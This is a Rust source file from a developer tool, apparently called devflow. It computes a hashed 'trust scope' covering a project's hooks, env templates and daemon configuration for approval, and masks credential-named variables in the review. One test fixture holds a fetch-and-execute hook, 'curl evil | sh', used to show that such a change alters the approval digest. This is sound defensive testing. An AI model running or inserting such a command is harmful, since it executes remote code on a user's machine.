//! The trust scope: everything one approval covers.
//!
//! Version 2 is the project's `[hooks]` (every phase, each command with its
//! name and effective timeout), its `[env]` recipes and presets (the keys and
//! value *templates*, never a generated value), and the pitchfork
//! configuration of the project directory (every daemon, see
//! [`crate::pitchfork_scope`]). The scope is built from files only: no
//! database and no generated password, so a password can never be part of it.
//! The one thing taken from the workspace's receipt is the namespace and label
//! devflow generated for it, which are the only `namespace` and
//! `worktree_label` values left out of the digest.
//!
//! The digest is the SHA-256 of the scope's canonical JSON (fields in
//! declaration order, maps sorted), so equal content has an equal digest
//! whatever the order of keys in the files, whether a hook was written as a
//! string or a table, or how a duration was spelled.
use crate::config::{Config, HookEntry};
use crate::config_edit::masked_template;
use crate::hooks::HookPhase;
pub use crate::pitchfork_scope::{Identity, Item, ProcessesScope, Trigger};
use crate::redact::MASK;
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::path::Path;

/// The version of the approval scope. A stored approval carries the version
/// it was made under, and one of another version never authorizes this scope.
/// Version 1 covered `[hooks]` alone.
pub const VERSION: u32 = 2;

/// One hook command as approved.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HookScope {
    pub name: Option<String>,
    pub run: String,
    /// The effective timeout (its own, else `[hooks] timeout`), normalized.
    pub timeout: String,
}

/// `[hooks]`, normalized.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HooksScope {
    pub setup: Vec<HookScope>,
    pub switch: Vec<HookScope>,
    pub teardown: Vec<HookScope>,
    /// The section's default timeout, normalized.
    pub timeout: String,
}

impl HooksScope {
    pub fn is_empty(&self) -> bool {
        self.setup.is_empty() && self.switch.is_empty() && self.teardown.is_empty()
    }

    /// The commands of `phase`, as shown to people.
    pub fn phase(&self, phase: HookPhase) -> &[HookScope] {
        match phase {
            HookPhase::Setup => &self.setup,
            HookPhase::Switch => &self.switch,
            HookPhase::Teardown => &self.teardown,
        }
    }
}

/// `[env]`: the presets and the recipes' value templates.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct EnvScope {
    /// Sorted, without repeats.
    pub presets: Vec<String>,
    /// Variable name to value template, exactly as written (`${DATABASE_URL}`,
    /// not what it expands to).
    pub vars: BTreeMap<String, String>,
}

impl EnvScope {
    pub fn is_empty(&self) -> bool {
        self.presets.is_empty() && self.vars.is_empty()
    }
}

/// Everything one approval covers.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Scope {
    pub version: u32,
    pub hooks: HooksScope,
    pub env: EnvScope,
    pub processes: ProcessesScope,
    pub digest: String,
}

/// What is hashed: the scope without its digest.
#[derive(Serialize)]
struct Content<'a> {
    version: u32,
    hooks: &'a HooksScope,
    env: &'a EnvScope,
    processes: &'a ProcessesScope,
}

/// One block of the review a person reads before approving.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScopeSection {
    /// `setup`, `switch`, `teardown`, `timeout`, `env`, `processes` or `autonomous`.
    pub id: &'static str,
    pub title: String,
    /// Text to show. The variables of `[env]` (and of pitchfork `env` tables)
    /// are already judged by their names, like `env list` ([`masked_template`]);
    /// frontends still run [`crate::redact::text`] over it for the credentials
    /// written into commands and other values.
    pub lines: Vec<String>,
    /// Something that deserves a warning (autonomous triggers, unreadable files).
    pub warning: bool,
}

/// The `env` table of a pitchfork file or daemon, judged by variable name.
fn mask_env_table(key: &str, item: &mut Item) {
    let (true, Item::Table(vars)) = (key == "env", item) else {
        return;
    };
    for (name, value) in vars.iter_mut() {
        let shown = match &*value {
            Item::Text(text) => Item::Text(masked_template(name, text)),
            // A number or a flag under a credential name is the credential.
            Item::Int(_) | Item::Bool(_) if crate::redact::is_secret_variable(name) => {
                Item::Text(MASK.to_string())
            }
            other => other.clone(),
        };
        *value = shown;
    }
}

/// `15m`, `1m 30s`: a duration spelled one way, whatever the input was.
fn normalized(timeout: &str) -> String {
    humantime::parse_duration(timeout)
        .map(|d| humantime::format_duration(d).to_string())
        .unwrap_or_else(|_| timeout.to_string())
}

impl Scope {
    /// The scope of `config`, with the pitchfork files read from `dir`. No
    /// `namespace` or `worktree_label` is left out of it; see [`Scope::build_with`].
    pub fn build(config: &Config, dir: &Path) -> Scope {
        Scope::build_with(config, dir, None)
    }

    /// [`Scope::build`] for a workspace devflow generated pitchfork identity
    /// values for (see [`Identity`]): the `namespace` and `worktree_label`
    /// that equal them are left out, so writing `pitchfork.local.toml` does
    /// not move the digest. Any other value of either key is part of the scope.
    pub fn build_with(config: &Config, dir: &Path, identity: Option<&Identity>) -> Scope {
        let hooks = &config.hooks;
        let default = normalized(&hooks.timeout);
        let entries = |entries: &[HookEntry]| {
            entries
                .iter()
                .map(|entry| HookScope {
                    name: entry.name.clone(),
                    run: entry.run.clone(),
                    timeout: entry
                        .timeout
                        .as_deref()
                        .map(normalized)
                        .unwrap_or_else(|| default.clone()),
                })
                .collect()
        };
        let hooks = HooksScope {
            setup: entries(&hooks.setup),
            switch: entries(&hooks.switch),
            teardown: entries(&hooks.teardown),
            timeout: default.clone(),
        };
        let (presets, vars) = config.env.canonical();
        let env = EnvScope {
            presets: presets.into_iter().map(str::to_string).collect(),
            vars: vars.clone(),
        };
        let processes = ProcessesScope::read_for(dir, identity);
        let mut scope = Scope {
            version: VERSION,
            hooks,
            env,
            processes,
            digest: String::new(),
        };
        scope.digest = scope.compute_digest();
        scope
    }

    fn compute_digest(&self) -> String {
        let content = Content {
            version: self.version,
            hooks: &self.hooks,
            env: &self.env,
            processes: &self.processes,
        };
        // Plain data (strings, lists, sorted maps) always serializes.
        let json = serde_json::to_vec(&content).unwrap_or_default();
        Sha256::digest(json)
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect()
    }

    /// Nothing in the scope runs or configures anything: no hook command, no
    /// `[env]`, no pitchfork configuration. Only then is there nothing to approve.
    pub fn is_empty(&self) -> bool {
        self.hooks.is_empty() && self.env.is_empty() && self.processes.is_empty()
    }

    /// Whether pitchfork can start something in this scope without devflow
    /// (`cron`, `watch`, `boot_start` or `auto` on a daemon).
    pub fn has_autonomous_triggers(&self) -> bool {
        !self.processes.autonomous.is_empty()
    }

    /// Whether setting up a workspace executes or changes anything this
    /// approval governs: setup commands, or `[env]` content. (`switch` and
    /// `teardown` have their own checks.)
    pub fn gates_setup(&self) -> bool {
        !self.hooks.setup.is_empty() || !self.env.is_empty()
    }

    /// This scope with the variables that hold credentials masked, for
    /// showing: `[env]` recipes and the `env` tables of pitchfork files are
    /// judged by the variable's name, as `env list` does ([`masked_template`]:
    /// a credential-named variable with literal text is `***`, a template made
    /// of `${NAME}` references only is shown as written). The digest is the
    /// original's and does not describe this copy: it is never hashed or
    /// approved, which is why it is private.
    fn masked(&self) -> Scope {
        let mut shown = self.clone();
        for (name, template) in &mut shown.env.vars {
            *template = masked_template(name, template);
        }
        for layer in &mut shown.processes.layers {
            for (key, item) in &mut layer.shared {
                mask_env_table(key, item);
            }
            for daemon in &mut layer.daemons {
                for (key, item) in &mut daemon.fields {
                    mask_env_table(key, item);
                }
            }
        }
        shown
    }

    /// The scope as the JSON document `devflow --json trust` prints: the same
    /// shape as the scope itself, with [`Scope::masked`]'s variables. The
    /// digest is the real scope's.
    pub fn review_json(&self) -> serde_json::Value {
        // Plain data (strings, lists, sorted maps) always serializes.
        serde_json::to_value(self.masked()).unwrap_or_default()
    }

    /// The review, block by block. The three hook phases are always listed
    /// (an empty one has no lines); the other blocks only when they have content.
    /// Credential-named `[env]` variables are masked (see [`Scope::masked`]).
    pub fn sections(&self) -> Vec<ScopeSection> {
        self.masked().all_sections()
    }

    fn all_sections(&self) -> Vec<ScopeSection> {
        let mut sections = Vec::new();
        for (id, title, phase) in [
            ("setup", "Setup", HookPhase::Setup),
            ("switch", "Switch", HookPhase::Switch),
            ("teardown", "Teardown", HookPhase::Teardown),
        ] {
            let lines = self
                .hooks
                .phase(phase)
                .iter()
                .map(|hook| {
                    let mut line = match &hook.name {
                        Some(name) => format!("[{name}] $ {}", hook.run),
                        None => format!("$ {}", hook.run),
                    };
                    if hook.timeout != self.hooks.timeout {
                        line.push_str(&format!("  (timeout {})", hook.timeout));
                    }
                    line
                })
                .collect();
            sections.push(ScopeSection {
                id,
                title: title.to_string(),
                lines,
                warning: false,
            });
        }
        sections.push(ScopeSection {
            id: "timeout",
            title: "Timeout per command".to_string(),
            lines: vec![self.hooks.timeout.clone()],
            warning: false,
        });
        if !self.env.is_empty() {
            let mut lines = Vec::new();
            if !self.env.presets.is_empty() {
                lines.push(format!("presets: {}", self.env.presets.join(", ")));
            }
            lines.extend(self.env.vars.iter().map(|(k, v)| format!("{k} = {v}")));
            sections.push(ScopeSection {
                id: "env",
                title: "Environment ([env])".to_string(),
                lines,
                warning: false,
            });
        }
        for layer in &self.processes.layers {
            let mut lines = Vec::new();
            if let Some(problem) = &layer.problem {
                lines.push(format!("this file {problem}"));
                if let Some(sha) = &layer.sha256 {
                    lines.push(format!("sha256 {sha}"));
                }
            }
            for (key, item) in &layer.shared {
                lines.push(format!("{key}: {}", item.display()));
            }
            for daemon in &layer.daemons {
                lines.push(format!("daemons.{}", daemon.id));
                if let Some(run) = &daemon.run {
                    lines.push(format!("  run: {run}"));
                }
                if let Some(dir) = &daemon.dir {
                    lines.push(format!("  dir: {dir}"));
                }
                for (key, item) in &daemon.fields {
                    lines.push(format!("  {key}: {}", item.display()));
                }
            }
            sections.push(ScopeSection {
                id: "processes",
                title: format!("Processes ({})", layer.file),
                lines,
                warning: layer.problem.is_some(),
            });
        }
        if self.has_autonomous_triggers() {
            sections.push(ScopeSection {
                id: "autonomous",
                title: "Starts without devflow".to_string(),
                lines: self
                    .processes
                    .autonomous
                    .iter()
                    .map(|t| format!("{} in {}: {}", t.daemon, t.file, t.trigger))
                    .collect(),
                warning: true,
            });
        }
        sections
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::Config;

    const HEAD: &str =
        "[project]\nname = \"shop\"\nid = \"0b3c9d2e-1111-4222-8333-444455556666\"\n";

    fn config(extra: &str) -> Config {
        Config::parse(&format!("{HEAD}{extra}")).unwrap()
    }

    fn scope(extra: &str) -> Scope {
        Scope::build(&config(extra), tempfile::tempdir().unwrap().path())
    }

    #[test]
    fn the_same_scope_has_the_same_digest_however_it_is_written() {
        let one = scope(
            "[hooks]\nsetup = [\"bun install\", { name = \"migrate\", run = \"bun run db\", timeout = \"90s\" }]\n\
             [env]\npresets = [\"prisma\", \"laravel\"]\nB = \"${PGHOST}\"\nA = \"x\"\n",
        );
        let two = scope(
            "[env]\nA = \"x\"\nB = \"${PGHOST}\"\npresets = [\"laravel\", \"prisma\"]\n\
             [hooks]\ntimeout = \"900s\"\nsetup = [\"bun install\", { run = \"bun run db\", timeout = \"1m 30s\", name = \"migrate\" }]\n",
        );
        assert_eq!(one.digest, two.digest);
        assert_eq!(one, two);
        assert_eq!(one.digest.len(), 64);
        assert_eq!(one.version, 2);
        assert_eq!(one.hooks.timeout, "15m");
        assert_eq!(one.hooks.setup[1].timeout, "1m 30s");
        // Building it again gives the same bytes.
        assert_eq!(one.digest, scope("[hooks]\nsetup = [\"bun install\", { name = \"migrate\", run = \"bun run db\", timeout = \"90s\" }]\n[env]\npresets = [\"prisma\", \"laravel\"]\nB = \"${PGHOST}\"\nA = \"x\"\n").digest);
    }

    #[test]
    fn every_part_of_the_scope_changes_the_digest() {
        let base = "[hooks]\nsetup = [{ name = \"m\", run = \"a\" }]\nswitch = [\"b\"]\nteardown = [\"c\"]\n[env]\nA = \"1\"\n";
        let digest = scope(base).digest;
        for changed in [
            base.replace("run = \"a\"", "run = \"a2\""),
            base.replace("name = \"m\"", "name = \"n\""),
            base.replace(
                "{ name = \"m\", run = \"a\" }",
                "{ name = \"m\", run = \"a\", timeout = \"1m\" }",
            ),
            base.replace("switch = [\"b\"]", "switch = [\"b\", \"b2\"]"),
            base.replace("teardown = [\"c\"]", "teardown = [\"c2\"]"),
            base.replace("[hooks]", "[hooks]\ntimeout = \"1h\""),
            base.replace("A = \"1\"", "A = \"2\""),
            base.replace("A = \"1\"", "A = \"1\"\nB = \"1\""),
            base.replace("[env]", "[env]\npresets = [\"prisma\"]"),
        ] {
            assert_ne!(scope(&changed).digest, digest, "{changed}");
        }
        // Order of commands matters, order of presets and recipes does not.
        assert_ne!(
            scope("[hooks]\nsetup = [\"a\", \"b\"]\n").digest,
            scope("[hooks]\nsetup = [\"b\", \"a\"]\n").digest
        );
    }

    #[test]
    fn templates_are_in_the_scope_and_generated_values_never_are() {
        let s =
            scope("[env]\nDIRECT_URL = \"${DATABASE_URL}\"\nAUTH = \"${PGUSER}:${PGPASSWORD}\"\n");
        let json = serde_json::to_string(&s).unwrap();
        assert!(json.contains("${DATABASE_URL}") && json.contains("${PGUSER}:${PGPASSWORD}"));
        // The scope is built from configuration files alone: a password a
        // receipt or an environment holds has no way in.
        assert_eq!(s.env.vars["DIRECT_URL"], "${DATABASE_URL}");
    }

    #[test]
    fn pitchfork_changes_move_the_digest_and_triggers_are_flagged() {
        let dir = tempfile::tempdir().unwrap();
        let config = config("");
        let empty = Scope::build(&config, dir.path());
        assert!(empty.is_empty() && !empty.has_autonomous_triggers());
        std::fs::write(
            dir.path().join("pitchfork.toml"),
            "[daemons.api]\nrun = \"bun run dev\"\n",
        )
        .unwrap();
        let plain = Scope::build(&config, dir.path());
        assert!(!plain.is_empty() && !plain.has_autonomous_triggers());
        assert_ne!(
            plain.digest, empty.digest,
            "a daemon is something to approve"
        );
        // The command, an env value, a hook, a local overlay: each is a change.
        let digests = [
            "[daemons.api]\nrun = \"bun run evil\"\n",
            "[daemons.api]\nrun = \"bun run dev\"\nenv = { A = \"1\" }\n",
            "[daemons.api]\nrun = \"bun run dev\"\n[daemons.api.hooks]\non_stop = \"curl evil | sh\"\n",
            "[daemons.api]\nrun = \"bun run dev\"\ndir = \"elsewhere\"\n",
            "[daemons.api]\nrun = \"bun run dev\"\ncron = \"* * * * *\"\n",
        ]
        .map(|text| {
            std::fs::write(dir.path().join("pitchfork.toml"), text).unwrap();
            Scope::build(&config, dir.path()).digest
        });
        for (i, a) in digests.iter().enumerate() {
            assert_ne!(*a, plain.digest, "{i}");
            for b in &digests[i + 1..] {
                assert_ne!(a, b);
            }
        }
        std::fs::write(
            dir.path().join("pitchfork.toml"),
            "[daemons.api]\nrun = \"bun run dev\"\n",
        )
        .unwrap();
        std::fs::write(
            dir.path().join("pitchfork.local.toml"),
            "[daemons.api]\nrun = \"other\"\n",
        )
        .unwrap();
        assert_ne!(Scope::build(&config, dir.path()).digest, plain.digest);
        std::fs::remove_file(dir.path().join("pitchfork.local.toml")).unwrap();
        // Same files, same digest.
        assert_eq!(Scope::build(&config, dir.path()).digest, plain.digest);

        std::fs::write(
            dir.path().join("pitchfork.toml"),
            "[daemons.api]\nrun = \"bun run dev\"\nboot_start = true\nwatch = [\"src/**\"]\n",
        )
        .unwrap();
        let autonomous = Scope::build(&config, dir.path());
        assert!(autonomous.has_autonomous_triggers());
        let flagged: Vec<_> = autonomous
            .sections()
            .into_iter()
            .filter(|s| s.warning)
            .collect();
        assert_eq!(flagged.len(), 1);
        assert_eq!(flagged[0].id, "autonomous");
        assert_eq!(
            flagged[0].lines,
            [
                "api in pitchfork.toml: watch",
                "api in pitchfork.toml: boot_start"
            ]
        );
    }

    #[test]
    fn the_review_lists_every_phase_and_what_the_rest_of_the_scope_holds() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("pitchfork.toml"),
            "[daemons.api]\nrun = \"bun run dev\"\ndir = \"web\"\nenv = { PORT = \"3000\" }\ncron = \"0 * * * *\"\n",
        )
        .unwrap();
        let config = config(
            "[hooks]\nsetup = [\"bun install\", { name = \"migrate\", run = \"bun run db\", timeout = \"5m\" }]\n\
             teardown = [\"make clean\"]\n[env]\npresets = [\"prisma\"]\nEXTRA_URL = \"${DATABASE_URL}\"\n",
        );
        let sections = Scope::build(&config, dir.path()).sections();
        let by = |id: &str| sections.iter().find(|s| s.id == id).unwrap();
        assert_eq!(
            by("setup").lines,
            ["$ bun install", "[migrate] $ bun run db  (timeout 5m)"]
        );
        assert!(
            by("switch").lines.is_empty(),
            "an empty phase is still listed"
        );
        assert_eq!(by("teardown").lines, ["$ make clean"]);
        assert_eq!(by("timeout").lines, ["15m"]);
        assert_eq!(
            by("env").lines,
            ["presets: prisma", "EXTRA_URL = ${DATABASE_URL}"]
        );
        let processes = by("processes");
        assert_eq!(processes.title, "Processes (pitchfork.toml)");
        assert_eq!(
            processes.lines,
            [
                "daemons.api",
                "  run: bun run dev",
                "  dir: web",
                "  cron: 0 * * * *",
                "  env: {\"PORT\":\"3000\"}"
            ]
        );
        assert_eq!(by("autonomous").lines, ["api in pitchfork.toml: cron"]);
        let ids: Vec<_> = sections.iter().map(|s| s.id).collect();
        assert_eq!(
            ids,
            [
                "setup",
                "switch",
                "teardown",
                "timeout",
                "env",
                "processes",
                "autonomous"
            ]
        );
    }

    #[test]
    fn the_review_masks_credential_named_variables_like_env_list_and_keeps_the_scope_intact() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("pitchfork.toml"),
            "[daemons.api]\nrun = \"bun run dev\"\nenv = { DB_PASS = \"lit-d\", PORT = \"3000\" }\n", // kingfisher:ignore
        )
        .unwrap();
        let scope = Scope::build(
            &config(
                "[env]\nDB_PASS = \"lit-a\"\nSESSION_KEY = \"lit-b\"\nMY_CREDENTIAL = \"lit-c\"\n\
                 CACHE_PASS = \"${PGPASSWORD}\"\nAPP_LABEL = \"db-${DEVFLOW_WORKSPACE}\"\n\
                 URL_WITH = \"postgres://u:hunter2@h/db\"\n", // kingfisher:ignore
            ),
            dir.path(),
        );
        // What is hashed and approved is the real scope.
        assert_eq!(scope.env.vars["DB_PASS"], "lit-a");
        let digest = scope.digest.clone();

        let env_lines: Vec<String> = scope
            .sections()
            .into_iter()
            .find(|s| s.id == "env")
            .unwrap()
            .lines;
        for line in [
            "DB_PASS = ***",
            "SESSION_KEY = ***",
            "MY_CREDENTIAL = ***",
            "CACHE_PASS = ${PGPASSWORD}",
            "APP_LABEL = db-${DEVFLOW_WORKSPACE}",
        ] {
            assert!(
                env_lines.contains(&line.to_string()),
                "{line}: {env_lines:?}"
            );
        }
        let all = scope
            .sections()
            .iter()
            .flat_map(|s| s.lines.clone())
            .collect::<Vec<_>>()
            .join("\n");
        for literal in ["lit-a", "lit-b", "lit-c", "lit-d"] {
            assert!(!all.contains(literal), "{literal} in {all}");
        }
        assert!(all.contains("PORT\":\"3000"), "{all}");

        // The JSON has the same shape, the same digest and the masked variables.
        let shown = scope.review_json();
        assert_eq!(shown["digest"], digest);
        assert_eq!(shown["env"]["vars"]["DB_PASS"], "***");
        assert_eq!(shown["env"]["vars"]["CACHE_PASS"], "${PGPASSWORD}");
        assert_eq!(
            shown["processes"]["layers"][0]["daemons"][0]["fields"]["env"]["DB_PASS"],
            "***"
        );
        assert!(!shown.to_string().contains("lit-"), "{shown}");
        assert_eq!(
            shown["env"]["vars"]["URL_WITH"], "postgres://u:***@h/db",
            "the patterns still apply to any variable"
        );
        // And the scope itself was not touched.
        assert_eq!(scope.digest, digest);
        assert_eq!(scope.env.vars["DB_PASS"], "lit-a");
    }
}
